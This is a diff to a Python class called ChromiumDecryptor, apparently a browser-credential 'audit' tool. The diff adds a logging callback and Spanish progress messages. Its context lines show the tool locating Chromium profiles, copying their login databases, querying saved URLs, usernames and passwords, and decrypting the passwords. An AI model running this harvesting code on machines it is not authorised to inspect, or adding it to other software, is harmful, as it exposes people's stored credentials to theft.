@@ -237,14 +237,20 @@ class ChromiumDecryptor:
                 if db.exists(): targets.append({"name": name, "profile": p.name, "db_path": db, "key": key})
         return targets
 
-    def audit(self, output_dir: Path, skip_html=False, skip_csv=False, browser_filter=None):
+    def audit(self, output_dir: Path, skip_html=False, skip_csv=False, browser_filter=None, callback=None):
+        def log(msg, level="info"):
+            if callback: callback(msg, level)
+            else: getattr(logger, level)(msg)
+
+        log("Iniciando escaneo de objetivos...")
         targets = self.find_targets()
         if browser_filter:
             targets = [t for t in targets if browser_filter.lower() in t['name'].lower()]
         
+        log(f"Encontrados {len(targets)} perfiles para procesar.")
         data, filtered = [], []
         for t in targets:
-            logger.info(f"Auditando: {t['name']} ({t['profile']})")
+            log(f"Auditando: {t['name']} ({t['profile']})", "info")
             tmp = output_dir / f"tmp_{os.getpid()}.db"
             conn = None
             try:
@@ -252,13 +258,15 @@ class ChromiumDecryptor:
                 conn = sqlite3.connect(tmp)
                 cursor = conn.cursor()
                 cursor.execute("SELECT action_url, username_value, password_value FROM logins")
-                for row in cursor.fetchall():
+                rows = cursor.fetchall()
+                log(f"  [{t['name']}] Extrayendo {len(rows)} entradas...")
+                for row in rows:
                     if not (row[0] and row[1] and row[2]): continue
                     val = self.decrypt(row[2], t['key'])
                     entry = [t['name'], t['profile'], row[0], row[1], val]
                     if row[0].startswith(VALID_URL_PREFIXES): data.append(entry)
                     else: filtered.append(entry)
-            except Exception as e: logger.warning(f"Error en {t['name']}: {e}")
+            except Exception as e: log(f"Error en {t['name']}: {e}", "warning")
             finally:
                 if conn: conn.close()
                 tmp.unlink(missing_ok=True)
